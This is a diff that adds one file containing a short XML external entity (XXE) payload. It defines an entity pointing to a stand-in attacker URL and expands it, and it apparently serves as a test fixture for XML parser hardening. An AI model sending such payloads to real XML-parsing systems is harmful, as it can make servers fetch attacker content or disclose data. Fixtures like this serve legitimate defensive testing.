@@ -1,0 +1,1 @@
+<!DOCTYPE x [ <!ENTITY e SYSTEM "https://attacker.invalid/payload"> ]><x>&e;</x>
